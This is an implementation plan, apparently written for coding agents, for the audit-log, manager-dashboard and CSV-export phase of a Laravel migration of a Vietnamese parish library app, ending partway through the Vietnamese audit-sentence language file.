# Laravel Migration — Phase 1d: Oversight — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Status:** Complete

**Goal:** Phase 1's core loop made visible: the audit log rendered as BR §14's readable Vietnamese sentences with the raw before/after behind an expansion (`GetAuditLog`, shelf-scoped), the manager dashboard's stat cards and shelf totals computed live at query time (`GetManagerDashboard`, BR §8: never a stored counter), and the three CSV exports (`ExportBooksCSV`, `ExportReadersCSV`, `ExportLoansCSV`) as BOM-carrying, formula-neutralised, streamed files a volunteer can open in Excel without mojibake — completing spec §11's Phase 1 list: "the audit log, the manager dashboard … CSV export" (BR §1.4's own Phase 1 sentence names the audit log and the dashboard; BR §2 is where "CSV export of books, readers, and loans ships in Phase 1" is written).

**What this plan is not.** Phase 1 (BR §1.4's core loop) is split into four plans, each producing working software (the split is recorded in the 1a plan's header):

- **1a Catalogue** — done. Categories, books, copies, the copy-state commands.
- **1b Members** — done. Readers, registration, approval, the lifecycle commands.
- **1c Circulation** — done. Quick-lend, return with condition, renewals, overdue, void.
- **1d Oversight** — this plan. Audit-log surfacing, the manager dashboard, CSV export. Needs 1a–1c; all three are merged (`main` at `6661991`).

**The OPS §3.3 census, taken fresh for this plan.** §3.3's manager-query table contains exactly **25** rows. **This plan implements five**: `GetManagerDashboard`, `GetAuditLog` (shelf-scoped), `ExportBooksCSV`, `ExportReadersCSV`, `ExportLoansCSV`. This is the first plan in the migration that implements **zero commands** — every operation here is a query by OPS §1's definition, so nothing in this plan opens a write transaction or takes a row lock, and exactly **one** new `RuleViolated` code is minted (`audit_forbidden_field`, divergence 9's write-side guard — a hardening of the existing recorder, not an operation; Task 10 verifies it is the only one rather than assuming it). The other twenty rows, each named with its owning phase, verified against spec §11 and BR §1.4 rather than assumed:

- **`GetStatistics`** — **Phase 2**, despite sitting in OPS §3.3's manager table and despite BR §16.3 describing the screen. Both spec §11 ("Phase 2 — Community. … statistics …") and BR §1.4 ("Phase 2 — community. … feedback, statistics …") assign it there, and the assignment is not arbitrary: most of its figures (top books, top readers, daily loan charts) are loan aggregates that exist today, but the phase boundary is the spec's own, and the reference implementation (`old_next/src/domain/shelf/queries/get-statistics.ts`) ports cleanly whenever Phase 2 reaches it. The `/manage/statistics` route stays `under-construction`.
- **`GetBorrowRequestQueue`, `GetDonationQueue`, `GetCommentsList`, `GetAnnouncementsList` (manager)** — Phase 2, with the queues and moderation they read (spec §11).
- **`ListTitlesForLabels`, `ListCopiesForLabels`, `ExportLabelSheetPDF`, `ResolveCopyById`** — Phase 2 (spec §11 puts QR labels there; 1c's census said the same).
- **`GetPendingProfileChanges`** — **Phase 3** (spec §11: "cross-shelf audit and the profile-change queues"). 1b shipped the manager's *direct correction* (`UpdateReaderProfile`, `profile.corrected`); the propose/approve queue does not exist yet in `app/`, and no audit action for it is written (see the audit-action census below).
- **`GetShelfSettings` (manager, read-only)** — **Phase 3**, a judgment this plan records rather than hides: spec §11 names it in no phase explicitly. It is assigned to Phase 3 with the shelf-administration surfaces because it is the read-only twin of `GetBookshelfSettings` (§3.4, super-admin, Phase 3) and BR §1.4's Phase 1 list does not contain settings. The `/manage/settings` route stays `under-construction`.
- **The rest of §3.3** (`SearchBooksForLending`, `SearchReadersForLending`, `SearchLoansForReturn`, `GetBooksList`, `GetBookDetail` (manager), `GetReadersList`, `GetReaderDetail`, `GetPendingRegistrations`, `GetOverdueLoans`) — already shipped by 1a–1c.
- **All of OPS §3.4** — `GetAdminOverview`, `GetBookshelvesList`, `GetBookshelfSettings`, `GetManagersList`, `GetManagerActivity`, `GetAuditLog` (cross-shelf), `GetPendingManagerChanges`, `GetFeedbackInbox`, `GetFeedbackDetail`, `GetSystemSettings`, `DownloadSystemBackup` — **Phase 3** (spec §11: portal directory, multi-shelf administration, cross-shelf audit). The shelf-scoped `GetAuditLog` this plan builds deliberately excludes rows with a null `bookshelf_id` (global administrative acts), because those are the cross-shelf browser's, and none can exist before Phase 3 writes one.
- **OPS §4.6's notification commands and `GetMyNotifications` (§3.2), plus the reminder sweep (OPS §7)** — Phase 2, with the notification system (spec §11).

**The audit-action census — taken from the shipped code, not from the reference.** The reference's sentence map (`old_next/src/domain/kernel/audit-actions.ts`) holds 40+ actions across six groups; most of their writers do not exist in `app/` yet, and a sentence with no writer is "the shape that makes a stale map look maintained" (the reference's own words — its "no dead sentence" test exists for exactly this). So this plan's map holds **exactly the 21 actions the shipped 1a–1c commands write**, verified by grepping every `->record(` call under `app/` (Task 1 turns that grep into a permanent architecture test):

| Group | Actions (writer) |
|---|---|
| `books` (8) | `book.created` (CreateBook), `book.updated` (UpdateBook), `book.deleted` (DeleteBook), `copy.added` (AddCopies), `copy.condition_assessed` (AssessCondition), `copy.lost_reported` (ReportCopyLost), `copy.found` (MarkCopyFound), `copy.retired` (RetireCopy) |
| `loans` (5) | `loan.created` (LendCopy), `loan.returned` (ReceiveReturn), `loan.renewed` (RenewLoan), `loan.voided` (VoidLoan), `loan.lost` (ReportCopyLost) |
| `readers` (8) | `membership.registered` (RegisterMembership / ManagerRegisterReader / RegisterMemberOnBehalf, via `Registration::auditAfter`), `membership.approved`, `membership.rejected`, `membership.suspended`, `membership.reactivated`, `membership.left`, `credentials.set` (SetReaderCredentials), `profile.corrected` (UpdateReaderProfile) |

All 21 sentences are buildable from what the shipped rows actually store — verified payload-by-payload against the Action sources, because three payloads were deliberately narrowed relative to the reference and the sentences must be written against the narrow truth:

- **`credentials.set` stores no payload at all** (`SetReaderCredentials.php:103`: `null, null`) — by design (BR §14: "the field that changed must never be recorded"). Its sentence resolves the subject from `entity_type = 'user'` + `entity_id`, needing no payload; its expansion shows nothing, which is correct and stated on the screen by the sentence itself ("đặt hoặc đổi tài khoản đăng nhập cho …").
- **`membership.registered` stores five keys** (`Registration::auditAfter`: `userId`, `fullName`, `status`, `parishUnitL1Id`, `parishUnitL2Id`) and no phone, DOB or parents — 1b's privacy narrowing. The sentence needs only `fullName`; the expansion honestly shows five rows.
- **`loan.returned`'s `before` drops the previous condition** the reference recorded (`receive-return.ts` stores `before.condition`; `app/Actions/Circulation/ReceiveReturn.php:94` stores only `status` + `copy_state`). The sentence reads `after.condition` and is unaffected; only the expansion's condition *transition* is lost. Recorded as a known-gap with an open question (below) rather than silently absorbed.

Every sentence that names a person resolves the name at read time from an id the row stores (`entity_id` for `user`/`membership` entities; `after.borrower_id` for loans), never re-reading a title or a value a later command can rewrite — the reference's P1 §3.2a rule, which the shipped commands already obey on the write side by storing `title` in the entry.

**Architecture:** All-read phase in the established 1a–1c shape: read shapes in `app/Queries/`, pure functions in `app/Support/` (`AuditSentences`, `AuditSecrets`, `Csv` — no framework boot needed to test any of them, matching how `RuleViolatedCodesHaveSentencesTest` reads `lang/vi/rules.php` by `require`), thin controllers, Inertia pages, routes behind the existing `role:manager` middleware (404 for a reader, redirect for a guest — nothing new to build there). The one write-side touch is a hardening, not a feature: `AuditRecorder` gains the reference's `assertNoSecrets` walk so a payload key shaped like a secret can never enter the log this phase makes readable. Audit sentences are **server copy**, composed in PHP from `lang/vi/audit.php` and shipped as finished strings in props (the same side of the client/server copy line `lang/vi/rules.php`'s refusal sentences already sit on); the client contributes only the time/date numbers, through `Intl`, exactly as it already does for due dates.

**Tech Stack:** unchanged — PHP 8.4, Laravel 13, Inertia v3, React 19, Tailwind v4, MariaDB 10.11, Pest 5, Larastan level 8, Pint, Biome 2, Bun.

**Spec:** docs/superpowers/specs/2026-08-26-laravel-mariadb-inertia-migration-design.md

**The reference implementation is the specification.** `old_next/src/domain/shelf/queries/get-audit-log.ts`, `get-manager-dashboard.ts`, `exports.ts`; `old_next/src/domain/kernel/audit-actions.ts` and `audit.ts`; `old_next/src/lib/audit-log.ts`, `exports.ts`, `csv.ts`; the built screens `old_next/src/app/tu-sach/[shelf]/quan-ly/page.tsx`, `.../nhat-ky/page.tsx`, `.../xuat/[loai]/route.ts`; and their tests under `old_next/tests/domain/shelf/`, `old_next/tests/domain/kernel/audit-actions.test.ts` and `old_next/tests/lib/csv.test.ts`. **Every task below starts by reading the reference file it ports.** Divergences, collected:

1. **The sentence map holds 21 actions, not the reference's 40+** — only actions a shipped command writes (census above). The reference's own "no dead sentence" rule, applied at the map's birth instead of retrofitted. Later phases extend the map in the same commit that adds a writer; Task 1's census test forces exactly that.
2. **Sentences are composed server-side** (`app/Support/Audit/AuditSentences` + `lang/vi/audit.php`), not in a client-importable domain module — the reference's TS domain ran on the server too, so this is the same placement under the new stack. The client renders `{sentence} lúc {time} ngày {date}` with the two numbers from `Intl` (the reference's own split: "every word of the sentence is this module's; every number in it is `Intl`'s").
3. **The expansion rows are computed server-side too** (`AuditSentences::payloadRows`), for the same reason the sentence is: the em-dash-versus-`null` distinction ("not recorded" vs "recorded as nothing") is behaviour worth a Pest test, and this repo has no JS test runner — a client-side port would ship the subtlest rule in the file untested. The reference's `payloadRows` semantics are kept exactly: union of keys, sorted; `—` for a key the bag does not have; `null` rendered as the string `null`.
4. **Group keys are English** (`loans` | `books` | `readers` in `?group=`), where the reference used Vietnamese slugs (`muon-tra`, `sach`, `nguoi-doc`) — 1c divergence 7's rule (English query-string vocabulary), labels stay Vietnamese in `copy.ts`.
5. **The subject join through the JSON payload carries a collation guard the reference did not — and the reason is NOT the one this plan first wrote down.** The reference regex-checked a payload uuid before a `::uuid` cast (a bad cast is a raw 22P02 there). The obvious MariaDB analogue would be errno 1267, this repo's six-times-paid 500 — but **measured against MariaDB 10.11.19 in this project's own container, it is not**:

   | expression compared with `users.id` (`ascii_bin`) | result |
   |---|---|
   | `JSON_UNQUOTE(JSON_EXTRACT(after,'$.borrower_id'))` carrying `Giáo họ Đức Mẹ 📚` | **no error**, no match (`COERCIBILITY` = 4, so the column's `ascii_bin` wins and MariaDB converts per row) |
   | a non-ASCII **constant or PDO bind** (`WHERE users.id = 'Giáo họ Đức Mẹ 📚'`) | **errno 1267** — the repertoire is known at parse time |

   So 1267 is a property of **binds**, not of this JSON expression: `SafeId::isUuid` on `?actor=` (Task 4) is where the real guard lives, and it is doing real work. The `CONVERT(… USING ascii) COLLATE ascii_bin` on the payload join is kept anyway, as cheap defence-in-depth against a future MariaDB whose coercion rules differ and against a `where`-bound variant of the same join — and it was measured not to cost anything: `EXPLAIN` shows `eq_ref` on `users` `PRIMARY` **with and without** it, non-ASCII bytes degrade to `?` (which no uuid can contain, so no row that did not match before matches now), and the unconvertible-character diagnostic is warning 1977, never an error, under this project's `sql_mode`. **Task 3's hostile-payload test must therefore be written as what it actually proves** — the row renders its bare-form sentence and the page does not 500 — and must not claim the guard is what saves it, because removing the guard leaves the test green.
6. **`GetManagerDashboard` ships two of BR §16.3's four stat cards and no activity feed — the reference's own final state, phase-shifted.** The reference shipped three cards only after C2 gave *Yêu cầu mượn* a query and a screen, kept *Bình luận chờ duyệt* out until B3, and **never built the activity feed at all** (its dashboard docstring: the feed "is the audit log rendered as readable sentences, which is the audit browser"). Here *Yêu cầu mượn* and *Bình luận chờ duyệt* are Phase 2's — a card showing a structurally-guaranteed 0 over an `under-construction` link is the "no comments waiting" lie the reference's U3 removed — and no substitute card is promoted (BR §16.3's own ruling about the donation queue: "a fifth card would be a change to that decision"). The audit browser, one nav tap away and built by this very plan, is the recent-activity surface.
7. **Exports are POST-only, streamed, and CSRF-protected by the framework.** The reference's `route.ts` argues POST at length (a GET is a bookmarkable, history-resident link to a file of children's records) and hand-rolls a same-origin check because Next route handlers get none. Both port: the route is `POST /manage/exports/{kind}` with **no GET** (a GET answers 405, pinned), and Laravel's `VerifyCsrfToken` replaces the hand-rolled origin check outright — an Inertia-served page posts a plain `<form>` carrying the shared CSRF token. `response()->stream` replaces the reference's buffer-then-respond **for the bytes**, so the CSV text is never assembled in one string. **It does NOT bound memory, and this plan does not claim it does**: `ExportController::store` runs the whole query and builds the whole `ExportTables` grid before returning the response, because the queries need the bound tenant and `TenantContext` is not guaranteed to survive into the streaming callback (the callback runs after the middleware stack has returned). Rows are therefore materialised exactly as in the reference, and the reference's "stops being reasonable around a hundred thousand rows" limit is **carried forward unchanged**, recorded in known-gaps (Task 10), not closed. Closing it needs a cursor plus an explicit shelf id captured into the closure — a Phase 2 change, decided when a shelf approaches the scale, with open question 5's queued shape as the other candidate.
8. **Export kind slugs are English** (`books` | `readers` | `loans`), matching the routes file's existing `/exports/{kind}` (spec §6); the reference used `sach` | `nguoi-doc` | `muon-tra`. Filenames keep both spellings: an ASCII fallback (`books-dong-thap-2026-08-29.csv`) and an RFC 6266 `filename*` carrying the Vietnamese label and shelf name, via Symfony's `HeaderUtils::makeDisposition` instead of the reference's hand-built header.
9. **`AuditRecorder` gains the reference's `assertNoSecrets` guard** (`old_next/src/domain/kernel/audit.ts`: the FORBIDDEN token list, the allowed-suffix carve-outs, the recursive walk that caught nested `{ credentials: { password_hash } }`). The shipped recorder has no such check — nothing has been written that trips it (Task 2 proves that for all 21 shipped payload shapes), but this phase turns the log into a rendered, exported surface, and BR §14's "passwords and session tokens are never captured" deserves a mechanism, not a habit. The refusal is a `RuleViolated('audit_forbidden_field')` — the one new literal code this plan mints, added to `RuleViolatedCodesHaveSentencesTest`'s census in the same task.
10. **The audit query filters `bookshelf_id` by hand, and the tenancy tripwire is amended to say so by name.** `AuditLog` is one of the two models pinned as exempt from `BelongsToBookshelf` (`TenancyArchitectureTest`: its `bookshelf_id` is nullable because global rows exist), so no global scope filters it and `AuditLogQuery` must write the `where` itself — exactly what `TenancyArchitectureTest`'s "confines bookshelf_id filtering to the two named files" grep forbids. Task 3 adds `app/Queries/AuditLogQuery.php` as the third named file, with the justification in the test: the exemption follows the model exemption it already records, and the isolation property moves from a scope to that query's own two-shelf-plus-global-row test.

## Global Constraints

Phase 0's, 1a's, 1b's and 1c's Global Constraints all still bind — branch `feat/phase-1d-oversight` (already created off merged `main`, `6661991`), MariaDB 10.11 via the `mariadb` driver, PHP 8.4, UUIDv7 `VARCHAR(36) ascii_bin`, `DATETIME(6)` UTC, English URIs, Bun/Composer, Pint + Larastan level 8 clean at every commit, commit per task in lowercase `type: sentence` style. Additionally, for this plan:

- **`old_next/` is read-only.** Nothing under it is edited, moved or deleted.
- **This is a read phase.** No task opens a write transaction against business tables; the only production write path touched is `AuditRecorder` (a guard added before its existing insert, no locking change — its insert stays the last statement of every command's transaction, preserving 1c's implicit-lock ordering analysis). If a task seems to need a lock or a stored counter, the task is wrong.
- **Derived state is computed on read** (BR §8, and OPS §3.3's own words for the dashboard: "never a stored counter, since a counter can drift"). Every dashboard figure is a `count()` at query time; overdue's one definition stays `due_on < Clock::today()` exactly as `OverdueLoansQuery` spells it, and Task 5 pins that the number *moves* when only the clock does.
- **Domain time goes through `App\Support\Clock`** — `now()` UTC, `today()` the civil date in `Asia/Ho_Chi_Minh`. Date-range filters and export timestamps convert between UTC storage and the shelf's civil day in PHP with `CarbonImmutable`, never with a bare cast — the reference paid a measured seven-hours-wrong bug for the sloppy spelling, twice (its `get-audit-log.ts` bound comment and its `exports.ts` `joined_on` comment; both port as tests here).
- **No sentence ever renders a raw action name.** `loan.created` on a volunteer's screen is a failure, not a fallback: an unknown action renders `lang/vi/audit.php`'s `unknown` phrase, and the stored name appears exactly once, inside the expansion, labelled — BR §14's own placement for stored values.
- **The audit log renders stored values, never re-derivations.** A sentence's title comes from `after.title` (stored by the command at the time), never from `books.title`; names come from id-resolution because a name is a *reference*, the one thing the log stores as an id on purpose. No query in this plan joins `books` to build a sentence.
- **`deleted_at` is deliberately NOT filtered on `users` in the audit query's name joins** — a soft-deleted person's name vanishing from history is the log rewriting itself (INV-12's spirit; the reference's explicit rule). Every other query in this repo filters it; this one must not, and Task 3 pins the difference.
- **UUID v7 keys — and `audit_log`'s BIGINT identity — make an unordered scan return creation order**, so every ordering test seeds in an order that DIFFERS from every asserted order, and the `occurred_at desc, id desc` tiebreak is proven on rows sharing one `occurred_at` (the ordinary case: `AddCopies` writes N rows at one clock instant).
- **A fixture with one row per shelf cannot distinguish "scoped to this shelf" from "scoped to everything"** — every isolation test seeds two shelves with *distinguishable* colliding data (different counts, different names) plus, for the audit log, a null-`bookshelf_id` global row, and asserts the foreign and global rows are absent by identity, not by count.
- **Prove an absence by leaking exactly one key** — `array_key_exists()`/`in_array()` per key, one assertion each; never `not->toHaveKeys([...])`, never `not->toHaveKey($key, "message")` (both inert, known-gaps). The readers-export `manager_notes` test writes a sentence into the column and asserts that exact string appears nowhere in the CSV bytes.
- **`SessionGuard` caches the `actingAs` user for the rest of a test method** — guest and second-actor coverage is ALWAYS its own `it()` block.
- **Every raw query parameter this plan reads is guarded before it can reach an `ascii_bin` bind** — the sixth-occurrence lesson, and `FreeTextEncodingGuardTest` cannot see controller-read parameters (its own third blind spot, recorded in known-gaps): `?actor=` goes through `App\Support\SafeId::isUuid` (or matches nothing), `?group=` through a closed-map lookup, `?from=`/`?to=` through a strict `Y-m-d` checkdate parse, `?page=` through `(int)`, `{kind}` through `array_key_exists` on a closed map. Task 4 and Task 9 each carry a live hostile-input test (`?actor=Giáo họ Đức Mẹ`, `?actor=📚`) asserting 200-with-empty-filter, never 500.
- **No hand-written `where('bookshelf_id', …)`** outside the tripwire's named files — which, from Task 3 on, are exactly three: `BookshelfScope`, `ResolveTenant`, `AuditLogQuery` (divergence 10). Everything else in this plan reads through `BelongsToBookshelf`-scoped models.
- **Never call `withoutGlobalScopes()` with no argument.**
- **Authorization refusals over HTTP are 404, never 403** — all new routes sit inside the existing `['auth', 'role:manager']` group; no new Form Request is created in this plan (GET filters and a closed-map POST need none), so 1b's `authorize()` trap has no surface here.
- **`DB::flushQueryLog()` between commands** in any test method exercising two commands — relevant to Task 2's recorder tests if they replay two writers in one method.
- **The one new `RuleViolated` literal (`audit_forbidden_field`) is written in the short, imported form** and added to `RuleViolatedCodesHaveSentencesTest`'s census in the same commit (Task 2) — the census regex cannot see a fully-qualified spelling.
- **No inline Vietnamese in TSX** — client copy in `resources/js/lib/copy.ts` (Biome's `noJsxLiterals` is an error), server copy in `lang/vi/audit.php` / `lang/vi/exports.php` (both loaded by `require` in pure classes, the `RuleViolatedCodesHaveSentencesTest` pattern, so unit tests need no framework boot).
- **Test helper names are process-global** (AGENTS.md). This plan's helpers, to be checked against `grep -rn "^function " tests/` before use (the 1a–1c registries are large — `odFix`, `mydFix`, `lcFixture`, `rdFixture`, `lendFix`, … are all TAKEN): `alogFix` (Task 3), `ascrFix` (Task 4), `mdqFix` (Task 5), `mdsFix` (Task 6), `xpqFix` (Task 8), `xphFix` (Task 9). Unit tasks (1, 2, 7) need no fixtures.
- **Factories under a bound tenant:** build fixtures under `TenantContext::actSystemWide()` (or pass `bookshelf_id` explicitly), then `set()` the tenant before acting.
- **`make test FILTER=…`** runs a filtered suite; `make lint` is Pint; `make analyse` is Larastan. Scratch output goes to `.artifacts/` (gitignored).

## Open questions — the product owner's, not this plan's, to settle

Each ships with this plan's proposed reading; none blocks the build, and each is one small change if ruled the other way.

1. **Should running an export itself write an audit entry?** OPS §3.3's own open question: exports are queries ("they change nothing") yet read every child's manager-only fields in bulk, and §14 says nothing about auditing a read. **Proposed: no audit write in 1d — the reference's own shipped decision, kept for parity.** Two additional arguments beyond parity: an audited export stops being a query (OPS §1's clean partition — every operation is a query or a command, "nothing is a third thing"), and an audit insert would make the export the first read surface to take the actor-row shared lock `docs/known-gaps.md`'s deadlock entry documents (`audit_log.actor_id` FK → `users.id`), an interaction a pure read phase otherwise never touches. If the owner rules the other way, the change is contained: one `run_export` action in the map, one sentence, one `AuditRecorder::record` call inside a small transaction in `ExportController` — plus that lock analysis, done then, not skipped.
   *Worked example of what the owner is choosing between:* today, after a manager downloads `readers-dong-thap-2026-08-29.csv`, the audit browser shows nothing; under the alternative it would show "Maria Nguyễn Thị Lan đã tải tệp danh sách bạn đọc lúc 14:32 ngày 29/08" and a super admin could later answer "who has been pulling the children's list."
2. **What does the expansion show of a child's changed personal data, and to whom?** `profile.corrected` rows store the changed fields' old and new values — phone, DOB, parents' names included. **Proposed: the expansion shows the stored `before`/`after` raw, to managers of that shelf only.** The argument: BR §14 places raw values behind the expansion explicitly; every key a shipped payload can contain is a field BR §16.3 already shows a manager of that shelf on the reader-detail screen (verified against the census — the narrowed payloads mean the log holds *less* than the screens do, e.g. registration's five keys); the page sits behind `role:manager`, the same gate as those screens; and secrets are excluded by construction (`credentials.set` stores nothing; Task 2's guard makes that a mechanism). What this deliberately does not do is re-narrow on read: an investigation that cannot see what changed is not an investigation, which is the only purpose BR §14 assigns the expansion.
3. **Should `ReceiveReturn` resume recording the previous condition in `loan.returned`'s `before`?** The reference stored `before.condition`; 1c's port dropped it (census note above). Old rows are unchanged either way — the expansion renders `—` for the absent key, correctly. **Proposed: yes — but NOT as one line.** `app/Actions/Circulation/ReceiveReturn.php:87-91` already runs `$copy->update(['condition' => $condition, …])` **before** the `record()` call at line 93, so `$copy->condition?->value` read inside the audit call is the NEW condition: a naive one-liner records `condition: "torn" → "torn"` and silently makes the expansion lie. The amendment is **two** lines — capture the value before the update, use the captured value in `before` (Task 10 Step 1 carries the exact code). Done in Task 10 as a write-side amendment with 1c's own test file extended — the condition transition ("Cũ" → "Rách") is exactly what a manager investigating a damage dispute opens the expansion for. If the owner prefers the log untouched mid-phase, the change is dropped and the known-gaps entry stays as the record.
   *Worked example:* a copy assessed `worn` goes out, comes back `torn`. Today's expansion shows `condition: — → "torn"`; with the line it shows `condition: "worn" → "torn"`.
4. **How far back does the audit log read, and how?** Nothing in BR §14 or OPS §3.3 bounds it; DATABASE.md's open question 2 (retention) is still open and stays open — INV-12 forbids pruning regardless. **Proposed: the reference's exact shape — paginated at 25/page (`?page=`), filterable by actor, group and an inclusive civil-date range (`?actor=`, `?group=`, `?from=`, `?to=`), default view = everything, newest first.** Unpaged is not an option for the one table with no size ceiling, and a default date cut would hide history a filter should reveal, not a default.
5. **Synchronous or queued exports?** Shared hosting's queue is a per-minute cron (`--stop-when-empty --max-time=50`), so a queued export means up to a minute's wait plus a retrieval surface (a notification or a polling page — neither exists before Phase 2), for a file that is a few hundred kilobytes at the scale BR §1 describes. **Proposed: synchronous, streamed** (divergence 7): `response()->stream` writes each row's bytes as it goes rather than concatenating one giant string, and the volunteer's browser shows an ordinary download. **Memory is not bounded** — the query and the grid are built before the response, because the streaming callback runs after `TenantContext` has stopped being reliable — so the reference's "unreasonable around a hundred thousand rows" horizon still stands and is recorded rather than claimed away. If a shelf someday outgrows the request timeout or that horizon, the two recorded fallbacks are a cursor with an explicitly captured shelf id, or the queued shape — decided then, with Phase 2's notification surface to hang it on.
   *Worked example:* today the manager taps "Tải danh sách bạn đọc" and the file lands in Downloads in under a second; the queued alternative would show "đang chuẩn bị tệp…", finish on the next cron tick, and need somewhere to say "xong rồi, tải ở đây."
6. **Do the manager nav links get badge counts in this phase?** The reference's `ManagerShell` renders counts beside nav entries on every manager page (one extra query set per request); BR §15's "managers work from dashboard badge counts" is satisfied by the dashboard's tappable cards alone. **Proposed: dashboard cards only in 1d; nav badges deferred to Phase 2**, when the count set stops being two of six and the shared-prop plumbing pays for all of them at once. The dashboard is one tap from anywhere in the manage area.

---

## File Structure

```
lang/vi/audit.php                          every sentence fragment: frame, 21 phrases, fallbacks, condition words
lang/vi/exports.php                        CSV headers + the enum words a spreadsheet cell needs
app/Support/Audit/AuditSentences.php       pure: ACTIONS map, sentence(), phrase(), groupOf(), actionsInGroup(), payloadRows()
app/Support/Audit/AuditSecrets.php         pure: assertNoSecrets() — FORBIDDEN tokens, allowed suffixes, recursive walk
app/Support/AuditRecorder.php              (modified: AuditSecrets::assertNoSecrets before the insert)
app/Support/Exports/Csv.php                pure: BOM, quote(), neutralise(), line()
app/Queries/AuditLogQuery.php              run() page of sentence-ready entries + actors() for the filter <select>
app/Queries/ManagerDashboardQuery.php      counts (overdue, pendingRegistrations) + totals (titles/copies/onLoan/readers)
app/Queries/Exports/BooksExportQuery.php   one row per copy, folded order
app/Queries/Exports/ReadersExportQuery.php full profile + parishLine, no manager_notes, hasCredentials boolean
app/Queries/Exports/LoansExportQuery.php   complete history incl. voided, newest first, VN-timezone instants
app/Support/Exports/ExportTables.php       rows → header + string-grid tables, enum words from lang/vi/exports.php
app/Http/Controllers/Manage/DashboardController.php   index
app/Http/Controllers/Manage/AuditLogController.php    index
app/Http/Controllers/Manage/ExportController.php      store (POST, streamed)
resources/js/pages/manage/dashboard.tsx    two stat cards, two big buttons, totals, today's date
resources/js/pages/manage/audit.tsx        filters, sentence rows, <details> expansion, export panel
resources/js/lib/dates.ts                  (+ formatInstantParts — ISO instant → {time, date} in Asia/Ho_Chi_Minh)
resources/js/lib/copy.ts                   (+ manage.audit / manage.dashboardPage / manage.exports namespaces)
resources/js/layouts/manage-layout.tsx     (+ Nhật ký nav entry)
app/Http/Middleware/HandleInertiaRequests.php  (+ csrfToken shared prop, for the plain export <form>)
routes/web.php                             dashboard + audit GET handlers filled in; exports GET → POST
tests/Unit/Audit/AuditSentencesTest.php
tests/Unit/Audit/AuditSecretsTest.php
tests/Unit/Exports/CsvTest.php
tests/Feature/Architecture/AuditActionCensusTest.php   every ->record('…') literal ↔ the sentence map, set-equal
tests/Feature/Architecture/TenancyArchitectureTest.php (modified: AuditLogQuery.php joins the allowed list)
tests/Feature/Oversight/AuditLogQueryTest.php
tests/Feature/Oversight/AuditScreenTest.php
tests/Feature/Oversight/ManagerDashboardQueryTest.php
tests/Feature/Oversight/DashboardScreenTest.php
tests/Feature/Oversight/ExportQueriesTest.php
tests/Feature/Oversight/ExportHttpTest.php
tests/Unit/Catalogue/RuleViolatedCodesHaveSentencesTest.php (modified: + audit_forbidden_field)
lang/vi/rules.php                          (+ audit_forbidden_field sentence)
docs/known-gaps.md                         (Task 10: the durable record)
```

---

### Task 1: The sentence layer — `lang/vi/audit.php`, `AuditSentences`, and the census that pins the map to the writers

Read first: `old_next/src/domain/kernel/audit-actions.ts` **whole** — the sentences below are its Vietnamese verbatim for the 21 actions this phase owns, and its docblocks carry the arguments (why no sentence renders a raw action name, why the actor's role is deliberately absent, why `str()` refuses non-strings). Also `old_next/tests/domain/kernel/audit-actions.test.ts` (the discovery test this task ports as `AuditActionCensusTest`) and `old_next/src/lib/audit-log.ts` (`payloadRows` — divergence 3 moves it server-side).

**Files:**
- Create: `lang/vi/audit.php`
- Create: `app/Support/Audit/AuditSentences.php`
- Test: `tests/Unit/Audit/AuditSentencesTest.php`
- Test: `tests/Feature/Architecture/AuditActionCensusTest.php`

**Interfaces:**
- Consumes: nothing from this plan — pure PHP, loads its own lang file by `require` (the `RuleViolatedCodesHaveSentencesTest` pattern, so unit tests run without framework boot).
- Produces (Tasks 3 and 4 build on these exact signatures):
  - `AuditSentences::ACTIONS` — `array<string, string>` of the 21 action names → group key (`'loans'|'books'|'readers'`).
  - `AuditSentences::actionsInGroup(string $group): list<string>`
  - `AuditSentences::groupOf(string $action): ?string` — `null` for a stored action this build has no entry for.
  - `AuditSentences::sentence(string $action, array $facts): string` — the full frame `"{actor} đã {phrase}"`, where `$facts` is `array{actor: ?string, subject: ?string, before: ?array<string,mixed>, after: ?array<string,mixed>}`. Never throws; never interpolates `$action`.
  - `AuditSentences::payloadRows(?array $before, ?array $after): list<array{field: string, before: string, after: string}>` — sorted key union; `—` for an absent key; `json_encode` for present values (`null` renders as `null`).

- [ ] **Step 1: Write the lang file**

`lang/vi/audit.php` — a plain returned array (loaded by `require`, not through `__()`, so it works framework-free; placeholders are `:name`-style, interpolated by `AuditSentences` with `strtr`):

```php
<?php

/**
 * BR §14's audit sentences — server copy, the rules.php side of the copy
 * line. Wording is the reference's audit-actions.ts verbatim for every
 * action a shipped command writes; nothing here renders a raw action name
 * (the 'unknown' phrase is the fallback, and the stored name appears only
 * in the expansion). The condition words duplicate copy.ts's six on
 * purpose — server sentences cannot reach client copy — and
 * AuditSentencesTest pins the two lists against each other so they cannot
 * drift silently.
 */
return [
    'frame' => ':actor đã :phrase',
    'system_actor' => 'Hệ thống',
    'unknown' => 'thực hiện một thao tác hệ thống chưa được mô tả',
    'someone' => 'một bạn đọc',
    'some_book' => 'một cuốn sách',
    'because' => ' vì :reason',

    // — sách —
    'book_created' => 'thêm sách :title',
    'book_updated' => 'sửa thông tin sách :title',
    'book_deleted' => 'xoá sách :title',
    'copy_added' => 'thêm bản sách :code',
    'copy_added_bare' => 'thêm một bản sách',
    'copy_condition_assessed' => 'ghi nhận tình trạng một bản sách: :condition',
    'copy_condition_assessed_bare' => 'ghi nhận tình trạng một bản sách',
    'copy_retired' => 'ngừng dùng một bản sách:because',
    'copy_lost_reported' => 'báo mất một bản sách',
    'copy_found' => 'tìm lại được một bản sách đã mất',

    // — mượn và trả —
    'loan_created' => 'cho :subject mượn :title',
    'loan_created_bare' => 'cho mượn :title',
    'loan_returned' => 'nhận trả :title:from:state',
    'loan_returned_from' => ' từ :subject',
    'loan_returned_state' => ', tình trạng :condition',
    'loan_renewed' => 'gia hạn một lượt mượn',
    'loan_voided' => 'huỷ một lượt mượn:because',
    'loan_lost' => 'kết thúc một lượt mượn vì sách bị mất',

    // — bạn đọc —
    'membership_registered' => 'nhận đăng ký của :name',
    'membership_registered_bare' => 'nhận một đăng ký mới',
    'membership_approved' => 'duyệt tài khoản của :subject',
    'membership_rejected' => 'từ chối đăng ký của :subject:because',
    'membership_suspended' => 'tạm khoá tài khoản của :subject',
    'membership_reactivated' => 'mở lại tài khoản của :subject',
    'membership_left' => 'đánh dấu :subject đã rời tủ sách',
    'credentials_set' => 'đặt hoặc đổi tài khoản đăng nhập cho :subject',
    'profile_corrected' => 'sửa hồ sơ của :subject',

